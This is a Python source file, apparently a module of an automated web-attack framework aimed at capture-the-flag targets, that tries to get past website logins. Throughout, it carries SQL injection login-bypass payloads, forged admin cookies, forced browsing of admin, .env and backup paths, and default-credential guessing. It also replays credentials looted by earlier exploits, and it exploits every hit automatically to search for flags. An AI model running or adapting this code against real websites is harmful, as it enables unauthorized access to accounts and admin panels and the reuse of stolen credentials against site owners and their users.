"""
EnoughOfWeb — Authentication Bypass Module
SQLi login bypass, cookie manipulation, forced browsing, default creds. Brute force LAST.
"""

import re
from typing import List, Optional
from urllib.parse import urljoin, urlparse

from modules.base import BaseExploit, Finding, ExploitResult, Severity
from core.loot_manager import LootManager


# ── SQLi auth bypass payloads ─────────────────────────────────────────────
SQLI_LOGIN_PAYLOADS = [
    {"user": "admin' --", "pass": "x"},
    {"user": "admin'--", "pass": "x"},
    {"user": "admin'#", "pass": "x"},
    {"user": "' OR 1=1--", "pass": "x"},
    {"user": "' OR 1=1#", "pass": "x"},
    {"user": "' OR '1'='1", "pass": "' OR '1'='1"},
    {"user": "' OR '1'='1'--", "pass": "x"},
    {"user": "' OR '1'='1'#", "pass": "x"},
    {"user": "admin' OR '1'='1'--", "pass": "x"},
    {"user": "admin' OR '1'='1'#", "pass": "x"},
    {"user": "admin'/*", "pass": "*/--"},
    {"user": "\" OR 1=1--", "pass": "x"},
    {"user": "\" OR \"1\"=\"1", "pass": "\" OR \"1\"=\"1"},
    {"user": "admin\" --", "pass": "x"},
    {"user": "admin\" OR \"1\"=\"1\"--", "pass": "x"},
    {"user": "') OR ('1'='1'--", "pass": "x"},
    {"user": "') OR 1=1--", "pass": "x"},
    {"user": "admin') --", "pass": "x"},
]

# ── Cookie manipulation payloads ──────────────────────────────────────────
COOKIE_MANIPULATIONS = [
    {"admin": "1"},
    {"admin": "true"},
    {"isAdmin": "true"},
    {"isAdmin": "1"},
    {"is_admin": "true"},
    {"is_admin": "1"},
    {"role": "admin"},
    {"role": "administrator"},
    {"user": "admin"},
    {"username": "admin"},
    {"auth": "true"},
    {"authenticated": "true"},
    {"logged_in": "true"},
    {"loggedin": "1"},
    {"access_level": "admin"},
    {"access_level": "9"},
    {"access": "admin"},
    {"privilege": "admin"},
    {"type": "admin"},
    {"user_type": "admin"},
]

# ── Forced browsing paths ─────────────────────────────────────────────────
ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/admin.php", "/admin.html",
    "/dashboard", "/dashboard/", "/panel", "/cpanel",
    "/manage", "/manager", "/management",
    "/admin/dashboard", "/admin/panel", "/admin/home",
    "/admin/flag", "/admin/config", "/admin/settings",
    "/user/admin", "/api/admin", "/api/admin/flag",
    "/flag", "/secret", "/hidden", "/internal",
    "/debug", "/console", "/phpmyadmin",
    "/wp-admin", "/wp-login.php",
    "/.env", "/config", "/backup",
]

# ── Default credentials ──────────────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("admin", ""),
    ("admin", "changeme"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
    ("user", "password"),
    ("demo", "demo"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("admin", "secret"),
    ("admin", "pass"),
]


class AuthBypassExploit(BaseExploit):
    name = "auth_bypass"
    description = "Authentication Bypass — SQLi login, cookie manip, forced browse, default creds (brute last)"
    priority = 9  # Lowest priority — try everything else first

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []

        # 1. Find login forms
        login_forms = self._find_login_forms(target_url, recon_data)

        # 2. Try forced browsing (no auth needed)
        forced = self._detect_forced_browsing(target_url, recon_data)
        if forced:
            findings.append(forced)

        # 3. Try cookie manipulation
        cookie_finding = self._detect_cookie_bypass(target_url, recon_data)
        if cookie_finding:
            findings.append(cookie_finding)

        # 4. Try SQLi login bypass
        for form in login_forms:
            sqli_finding = self._detect_sqli_login(target_url, form)
            if sqli_finding:
                findings.append(sqli_finding)
                break  # One SQLi finding is enough

        # 5. Try default credentials (brute force — LAST)
        for form in login_forms:
            cred_finding = self._detect_default_creds(target_url, form)
            if cred_finding:
                findings.append(cred_finding)
                break

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        try:
            return self._exploit_auth(finding)
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ── Detection methods ─────────────────────────────────────────────────

    def _find_login_forms(self, target_url, recon_data) -> list:
        """Find forms that look like login forms."""
        login_forms = []
        login_indicators = {"login", "signin", "sign-in", "auth", "log-in", "session"}
        password_fields = {"password", "pass", "passwd", "pwd", "secret"}

        for form in recon_data.get("forms", []):
            inputs = form.get("inputs", {})
            input_names = {k.lower() for k in inputs.keys()}
            action = (form.get("action", "") or "").lower()

            # Has password field?
            has_password = bool(input_names & password_fields)

            # Action URL contains login indicator?
            action_match = any(ind in action for ind in login_indicators)

            if has_password or action_match:
                # Identify username and password field names
                user_field = None
                pass_field = None

                for name in inputs:
                    nl = name.lower()
                    if nl in password_fields:
                        pass_field = name
                    elif nl in {"username", "user", "email", "login", "name", "uname", "usr"}:
                        user_field = name

                # If no explicit username field, pick the first non-password text input
                if not user_field:
                    for name in inputs:
                        if name.lower() not in password_fields:
                            user_field = name
                            break

                if user_field and pass_field:
                    login_forms.append({
                        "action": form.get("action", ""),
                        "method": form.get("method", "POST"),
                        "user_field": user_field,
                        "pass_field": pass_field,
                        "inputs": inputs,
                    })

        # Also check common login URLs if no forms found
        if not login_forms:
            for path in recon_data.get("interesting_paths", []):
                if any(ind in path.lower() for ind in login_indicators):
                    # Try to fetch and parse the login page
                    try:
                        from bs4 import BeautifulSoup
                        login_url = urljoin(target_url, path)
                        resp = self._request("GET", login_url)
                        soup = BeautifulSoup(resp.text, "html.parser")
                        for html_form in soup.find_all("form"):
                            inputs = {}
                            for inp in html_form.find_all(["input", "textarea"]):
                                name = inp.get("name")
                                if name:
                                    inputs[name] = inp.get("value", "")

                            input_names = {k.lower() for k in inputs}
                            if input_names & password_fields:
                                user_field = None
                                pass_field = None
                                for name in inputs:
                                    if name.lower() in password_fields:
                                        pass_field = name
                                    elif name.lower() in {"username", "user", "email", "login", "name"}:
                                        user_field = name
                                if not user_field:
                                    for name in inputs:
                                        if name.lower() not in password_fields:
                                            user_field = name
                                            break
                                if user_field and pass_field:
                                    login_forms.append({
                                        "action": html_form.get("action", path),
                                        "method": html_form.get("method", "POST"),
                                        "user_field": user_field,
                                        "pass_field": pass_field,
                                        "inputs": inputs,
                                    })
                    except Exception:
                        pass

        return login_forms

    def _detect_forced_browsing(self, target_url, recon_data) -> Optional[Finding]:
        """Try accessing admin/protected pages directly."""
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in ADMIN_PATHS:
            try:
                test_url = base + path
                resp = self._request("GET", test_url)

                if resp.status_code == 200 and len(resp.text) > 50:
                    text_lower = resp.text.lower()
                    # Check it's not a login redirect or 404
                    not_login = "login" not in text_lower[:200] and "sign in" not in text_lower[:200]
                    not_404 = "not found" not in text_lower and "404" not in text_lower[:100]
                    has_content = any(kw in text_lower for kw in ["admin", "dashboard", "flag", "secret", "config", "manage"])

                    if not_login and not_404 and has_content:
                        flag = self._check_flag(resp.text)
                        return Finding(
                            module=self.name,
                            vuln_type="forced-browsing",
                            target_url=test_url,
                            parameter="path",
                            method="GET",
                            payload=path,
                            evidence=f"Unprotected admin page: {path} ({len(resp.text)} bytes)",
                            severity=Severity.HIGH,
                            extra={"flag": flag, "path": path},
                        )
            except Exception:
                continue

        return None

    def _detect_cookie_bypass(self, target_url, recon_data) -> Optional[Finding]:
        """Try cookie manipulation to gain access."""
        # Get baseline
        try:
            baseline = self._request("GET", target_url)
            baseline_text = baseline.text
        except Exception:
            return None

        for cookies in COOKIE_MANIPULATIONS:
            try:
                resp = self._request("GET", target_url, cookies=cookies)

                # Check if response is significantly different
                if len(resp.text) != len(baseline_text):
                    diff = abs(len(resp.text) - len(baseline_text))
                    if diff > 50:
                        text_lower = resp.text.lower()
                        if any(kw in text_lower for kw in ["admin", "flag", "dashboard", "welcome", "secret"]):
                            return Finding(
                                module=self.name,
                                vuln_type="cookie-bypass",
                                target_url=target_url,
                                parameter="cookie",
                                method="GET",
                                payload=str(cookies),
                                evidence=f"Cookie manipulation changed response ({diff} bytes diff)",
                                severity=Severity.HIGH,
                                extra={"cookies": cookies},
                            )
            except Exception:
                continue

        return None

    def _detect_sqli_login(self, target_url, form) -> Optional[Finding]:
        """Try SQLi payloads on login form."""
        form_url = urljoin(target_url, form["action"])
        method = form.get("method", "POST").upper()
        user_field = form["user_field"]
        pass_field = form["pass_field"]
        base_inputs = form.get("inputs", {})

        # Get baseline (failed login)
        data = dict(base_inputs)
        data[user_field] = "nonexistent_user_12345"
        data[pass_field] = "wrong_password_12345"
        try:
            if method == "POST":
                baseline = self._request("POST", form_url, data=data)
            else:
                baseline = self._request("GET", form_url, params=data)
            baseline_len = len(baseline.text)
        except Exception:
            return None

        for payload_set in SQLI_LOGIN_PAYLOADS:
            data = dict(base_inputs)
            data[user_field] = payload_set["user"]
            data[pass_field] = payload_set["pass"]

            try:
                if method == "POST":
                    resp = self._request("POST", form_url, data=data)
                else:
                    resp = self._request("GET", form_url, params=data)

                # Success indicators
                diff = abs(len(resp.text) - baseline_len)
                text_lower = resp.text.lower()
                success_indicators = ["welcome", "dashboard", "admin", "logout", "flag",
                                     "profile", "account", "success", "logged in"]
                failure_indicators = ["invalid", "incorrect", "wrong", "failed", "error",
                                     "denied", "unauthorized"]

                has_success = any(ind in text_lower for ind in success_indicators)
                has_failure = any(ind in text_lower for ind in failure_indicators)

                # Different response + success indicators + no failure indicators
                if diff > 30 and has_success and not has_failure:
                    return Finding(
                        module=self.name,
                        vuln_type="sqli-login-bypass",
                        target_url=form_url,
                        parameter=user_field,
                        method=method,
                        payload=payload_set["user"],
                        evidence=f"SQLi login bypass successful (diff: {diff} bytes)",
                        severity=Severity.CRITICAL,
                        extra={
                            "form": form,
                            "payload_set": payload_set,
                        },
                    )

                # Also check for redirect (302) to admin/dashboard
                if resp.status_code in (301, 302, 303):
                    location = resp.headers.get("Location", "")
                    if any(kw in location.lower() for kw in ["admin", "dashboard", "home", "panel"]):
                        return Finding(
                            module=self.name,
                            vuln_type="sqli-login-bypass",
                            target_url=form_url,
                            parameter=user_field,
                            method=method,
                            payload=payload_set["user"],
                            evidence=f"SQLi login redirect to: {location}",
                            severity=Severity.CRITICAL,
                            extra={"form": form, "payload_set": payload_set, "redirect": location},
                        )
            except Exception:
                continue

        return None

    def _detect_default_creds(self, target_url, form) -> Optional[Finding]:
        """Try default credentials (LAST RESORT)."""
        form_url = urljoin(target_url, form["action"])
        method = form.get("method", "POST").upper()
        user_field = form["user_field"]
        pass_field = form["pass_field"]
        base_inputs = form.get("inputs", {})

        # Get baseline
        data = dict(base_inputs)
        data[user_field] = "nonexistent_zzzzzz"
        data[pass_field] = "wrong_zzzzzz"
        try:
            if method == "POST":
                baseline = self._request("POST", form_url, data=data)
            else:
                baseline = self._request("GET", form_url, params=data)
            baseline_len = len(baseline.text)
        except Exception:
            return None

        # Prepend LootDB credentials to default creds
        loot = LootManager()
        loot_creds = loot.get_credentials(target_url)
        
        dynamic_creds = []
        for cred in loot_creds:
            dynamic_creds.append((cred["username"], cred["password"]))
            # Also try combinations if it's lfi_env_pass_only
            if cred["source"] == "lfi_env_pass_only":
                dynamic_creds.append(("root", cred["password"]))
                dynamic_creds.append(("admin", cred["password"]))
                
        all_creds = dynamic_creds + DEFAULT_CREDS

        for username, password in all_creds:
            data = dict(base_inputs)
            data[user_field] = username
            data[pass_field] = password

            try:
                if method == "POST":
                    resp = self._request("POST", form_url, data=data, allow_redirects=False)
                else:
                    resp = self._request("GET", form_url, params=data, allow_redirects=False)

                # Success: redirect or different response
                if resp.status_code in (301, 302, 303):
                    return Finding(
                        module=self.name,
                        vuln_type="default-credentials",
                        target_url=form_url,
                        parameter=user_field,
                        method=method,
                        payload=f"{username}:{password}",
                        evidence=f"Login redirect with {username}:{password}",
                        severity=Severity.CRITICAL,
                        extra={"form": form, "username": username, "password": password},
                    )

                diff = abs(len(resp.text) - baseline_len)
                text_lower = resp.text.lower()
                if diff > 30 and any(kw in text_lower for kw in ["welcome", "dashboard", "flag", "logout"]):
                    return Finding(
                        module=self.name,
                        vuln_type="default-credentials",
                        target_url=form_url,
                        parameter=user_field,
                        method=method,
                        payload=f"{username}:{password}",
                        evidence=f"Default creds work: {username}:{password}",
                        severity=Severity.CRITICAL,
                        extra={"form": form, "username": username, "password": password},
                    )
            except Exception:
                continue

        return None

    # ── Exploitation ──────────────────────────────────────────────────────

    def _exploit_auth(self, finding: Finding) -> ExploitResult:
        """Exploit the auth bypass and look for flags."""
        url = finding.target_url

        if finding.vuln_type == "forced-browsing":
            flag = finding.extra.get("flag")
            if flag:
                return ExploitResult(success=True, flag=flag, payload_used=finding.payload, technique="forced-browsing")

            # Re-fetch and search for flags
            resp = self._request("GET", url)
            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(success=True, flag=flag, payload_used=finding.payload, technique="forced-browsing")

            # Try sub-paths of the found admin page
            for sub in ["/flag", "/flag.txt", "/config", "/secret", "/settings"]:
                try:
                    sub_url = url.rstrip("/") + sub
                    resp = self._request("GET", sub_url)
                    flag = self._check_flag(resp.text)
                    if flag:
                        return ExploitResult(success=True, flag=flag, payload_used=sub_url, technique="forced-browsing")
                except Exception:
                    continue

            return ExploitResult(
                success=True, payload_used=finding.payload, technique="forced-browsing",
                data_extracted=f"Unprotected admin page found at: {url}",
            )

        elif finding.vuln_type == "cookie-bypass":
            cookies = finding.extra.get("cookies", {})
            resp = self._request("GET", url, cookies=cookies)
            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(success=True, flag=flag, payload_used=str(cookies), technique="cookie-bypass")

            # Try admin paths with the cookies
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for path in ["/admin", "/dashboard", "/flag", "/admin/flag"]:
                try:
                    resp = self._request("GET", base + path, cookies=cookies)
                    flag = self._check_flag(resp.text)
                    if flag:
                        return ExploitResult(success=True, flag=flag, payload_used=str(cookies), technique="cookie-bypass")
                except Exception:
                    continue

            return ExploitResult(
                success=True, payload_used=str(cookies), technique="cookie-bypass",
                data_extracted=f"Cookie bypass works with: {cookies}",
            )

        elif finding.vuln_type in ("sqli-login-bypass", "default-credentials"):
            form = finding.extra.get("form", {})
            payload_set = finding.extra.get("payload_set")
            username = finding.extra.get("username", "")
            password = finding.extra.get("password", "")
            form_url = urljoin(url, form.get("action", ""))
            method = form.get("method", "POST").upper()
            user_field = form.get("user_field", "username")
            pass_field = form.get("pass_field", "password")

            # Log in
            data = dict(form.get("inputs", {}))
            if payload_set:
                data[user_field] = payload_set["user"]
                data[pass_field] = payload_set["pass"]
            else:
                data[user_field] = username
                data[pass_field] = password

            try:
                if method == "POST":
                    resp = self._request("POST", form_url, data=data)
                else:
                    resp = self._request("GET", form_url, params=data)

                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag, payload_used=finding.payload,
                        technique=finding.vuln_type,
                    )

                # Navigate to admin pages after login
                parsed = urlparse(url)
                base = f"{parsed.scheme}://{parsed.netloc}"
                for path in ["/admin", "/dashboard", "/flag", "/profile", "/admin/flag", "/home"]:
                    try:
                        resp = self._request("GET", base + path)
                        flag = self._check_flag(resp.text)
                        if flag:
                            return ExploitResult(
                                success=True, flag=flag, payload_used=finding.payload,
                                technique=finding.vuln_type,
                            )
                    except Exception:
                        continue

                return ExploitResult(
                    success=True, payload_used=finding.payload,
                    technique=finding.vuln_type,
                    data_extracted=f"Auth bypass successful with: {finding.payload}",
                )
            except Exception as e:
                return ExploitResult(success=False, error=str(e))

        return ExploitResult(success=False, error="Unknown auth bypass type")
